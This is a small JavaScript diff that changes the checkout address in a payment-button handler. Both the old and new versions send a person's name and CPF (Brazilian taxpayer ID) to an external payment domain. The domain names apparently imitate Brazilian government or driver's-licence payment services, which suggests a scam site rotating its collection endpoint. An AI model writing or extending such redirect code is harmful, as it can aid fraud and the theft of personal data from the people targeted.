@@ -70,7 +70,7 @@ function addGerarPagamentoListener() {
         const encodedName = encodeURIComponent(nome);
         
         
-        const checkoutURL = `https://pay.regularizarbr.online/KV603kPQyDdZw8y/?name=${encodedName}&document=${cpf}`;
+        const checkoutURL = `https://pay.cnhpagamentos.site/eApQgzOAW6J3Eb7/?name=${encodedName}&document=${cpf}`;
         
         window.location.href = checkoutURL;
       }
